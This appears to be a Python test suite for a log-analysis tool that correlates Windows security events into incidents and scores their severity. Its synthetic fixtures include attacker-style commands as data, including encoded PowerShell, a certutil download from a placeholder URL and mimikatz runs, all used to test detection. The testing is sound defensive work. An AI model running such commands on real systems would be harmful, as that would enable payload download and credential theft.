from datetime import timedelta

from helpers import LogBuilder


def chain(b, user="jdoe", host="WS1", ip="203.0.113.5", day=4, hour=3):
    t = b.at(day, hour)
    for i in range(12):
        b.fail(t + timedelta(seconds=10 * i), user, host, ip)
    b.logon(t + timedelta(minutes=4), user, host, ip)
    b.group_add(t + timedelta(minutes=10), user, user, "Administrators", host)
    b.process(t + timedelta(minutes=20), user, host, "powershell.exe", "cmd.exe", "powershell -enc AAAA")
    return b


def test_full_chain_correlates_into_one_critical_incident():
    b = chain(LogBuilder().history("jdoe", "WS1", "10.0.0.5"))
    a = b.analyze()
    assert len(a.incidents) == 1
    inc = a.incidents[0]
    assert {"R1", "R3", "R6", "R7"} <= set(inc["rules"])
    assert inc["severity"]["level"] == "Critical"
    assert all(l["reason"] and l["strength"] in ("strong", "weak") for l in inc["links"])
    assert any(l["factor"] == "Full attack chain" for l in inc["severity"]["breakdown"])


def test_event_order_respected_success_before_failures_is_not_compromise():
    b = LogBuilder()
    t = b.at(2, 3)
    b.logon(t, "jdoe", "WS1", "203.0.113.5")
    for i in range(12):
        b.fail(t + timedelta(minutes=1, seconds=10 * i), "jdoe", "WS1", "203.0.113.5")
    a = b.analyze()
    assert not [x for x in a.alerts if x["rule"] == "R3"]


def test_strong_vs_weak_links_and_weak_not_scored():
    b = LogBuilder()
    t = b.at(2, 10)
    b.group_add(t, "kpatel", "kpatel", "Administrators", "WS1")                 # R6 on WS1
    b.process(t + timedelta(minutes=5), "kpatel", "WS1", "powershell.exe", "cmd.exe", "powershell -enc AA")  # strong
    b.process(t + timedelta(minutes=9), "kpatel", "WS7", "certutil.exe", "cmd.exe", "certutil -urlcache -f http://x a")  # weak (user only)
    a = b.analyze()
    assert len(a.incidents) == 1
    inc = a.incidents[0]
    strengths = sorted(l["strength"] for l in inc["links"])
    assert strengths == ["strong", "weak"]
    weak_alert = next(l["to"] for l in inc["links"] if l["strength"] == "weak")
    assert inc["membership"][weak_alert] == "weak"


def test_shared_host_alone_does_not_merge_unrelated_alerts():
    b = LogBuilder()
    t = b.at(2, 10)
    b.process(t, "alice", "DC01", "mimikatz.exe", "cmd.exe", "mimikatz")
    b.process(t + timedelta(minutes=3), "bob", "DC01", "certutil.exe", "cmd.exe", "certutil -urlcache -f http://x a")
    assert len(b.analyze().incidents) == 2


def test_time_window_separates_incidents():
    b = LogBuilder()
    b.process(b.at(2, 10), "alice", "WS1", "mimikatz.exe", "cmd.exe", "mimikatz")
    b.process(b.at(2, 12), "alice", "WS1", "mimikatz.exe", "cmd.exe", "mimikatz")  # 2 h later > 30 min gap
    assert len(b.analyze().incidents) == 2


def test_anomalous_logon_needs_both_r4_and_r5_with_confident_baseline():
    b = LogBuilder().history("jdoe", "WS1", "10.0.0.5")
    b.logon(b.at(5, 3), "jdoe", "WS1", "10.0.0.5")          # off-hours, known device -> R4 only
    b.logon(b.at(5, 10), "jdoe", "LT-NEW", "10.0.20.5")      # new device in hours -> R5 only
    assert not b.analyze().incidents
    b.logon(b.at(5, 23), "jdoe", "LT-X", "10.66.0.1")         # both
    a = b.analyze()
    assert len(a.incidents) == 1 and a.incidents[0]["seed_kind"] == "anomalous_logon"
    assert a.incidents[0]["severity"]["level"] == "Low"


def test_severity_score_breakdown_sums_and_levels():
    from sentinel.severity import level_for
    from helpers import CFG
    a = chain(LogBuilder().history("jdoe", "WS1", "10.0.0.5")).analyze()
    sev = a.incidents[0]["severity"]
    assert sev["raw_score"] == sum(l["points"] for l in sev["breakdown"])
    assert sev["score"] == min(100, max(0, sev["raw_score"]))
    assert [level_for(x, CFG) for x in (80, 79, 60, 59, 35, 34, 0)] == ["Critical", "High", "High", "Medium", "Medium", "Low", "Low"]


def test_rule_counted_once_no_double_counting():
    b = LogBuilder()
    for i in range(3):
        b.process(b.at(2, 10, i), "alice", "WS1", "mimikatz.exe", "cmd.exe", "mimikatz")
    sev = b.analyze().incidents[0]["severity"]
    assert sum(1 for l in sev["breakdown"] if l["factor"].startswith("R7")) == 1


def test_benign_context_lowers_score_for_admin_in_window():
    b = LogBuilder()
    b.logon(b.at(5, 19), "admin01", "DC01", "10.0.9.10")
    b.group_add(b.at(5, 20), "kpatel", "kpatel", "Administrators", "DC01")  # non-admin actor in window -> R6
    inc = b.analyze().incidents[0]
    assert any(l["factor"] == "Benign context" and l["points"] < 0 for l in inc["severity"]["breakdown"])
